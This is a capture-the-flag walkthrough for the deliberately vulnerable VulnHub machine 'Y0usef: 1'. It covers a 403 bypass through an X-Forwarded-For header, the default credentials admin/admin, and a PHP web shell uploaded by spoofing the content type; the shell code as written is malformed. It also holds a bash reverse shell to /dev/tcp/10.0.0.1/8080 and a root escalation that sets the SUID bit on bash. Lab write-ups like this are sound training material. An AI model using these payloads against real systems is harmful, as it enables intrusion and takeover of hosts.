

# Y0usef: 1 Walkthrough 

**VulnHub Link:** [Y0usef: 1](https://www.vulnhub.com/entry/y0usef-1,624/)
**Difficulty:** Easy
**Release Date:** 10 Dec 2020


## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.172
```

## 2.Web Enumeration
```bash
wfuzz -c -u 'http://192.168.100.172/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404
```

we found nothing from webpage and only access to index.php

then we download bypass 403 
```bash
wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Y0usef%3A%201/bypass-403.sh
chmod +x bypass-403.sh
./bypass-403.sh http://192.168.100.172 adminstration
```

we found out that X-Forwarded-For: 127.0.0.1:80

opening burpsuite

in browser , enter url --> http://192.168.100.172/adminstration send request to repeater

add this to request --> X-Forwarded-For: 127.0.0.1:80

and you will see that username and password required

again send request to repeater --> username=admin&password=admin (again X-Forwarded-For: 127.0.0.1:80)

and you will see that you access admin page

from upload page , we found out we cant upload php file

send request to repeater ---> change content-type to image/gif

content --> 
<?php
    echo '<pre>';
    passtrhu(system($_GET['cmd']);
    echo '</pre>';
?>

and you will successfully upload php file 

in response copy that and new repeater tab , http://192.168.100.172/adminstration/upload/files/<your filename>?cmd=id

we encode bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'

we write to cmd == bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F8080%200%3E%261%27 

don't forget change ip and port number

and we get www-data shell

we find user.txt and 

```bash
echo "c3NoIDogCnVzZXIgOiB5b3VzZWYgCnBhc3MgOiB5b3VzZWYxMjM=" | base64 -d
```

we found yousef password 

```bash
ssh yousef@192.168.100.172 (password yousef123)
```

we found out that from 
```bash
sudo -l
```

ALL ALL:ALL command on yousef

```bash
chmod u+s /bin/bash
/bin/bash -p
cat /root/root.txt
```

and BOOOM..! We are ROOT and ROOT flag captured.
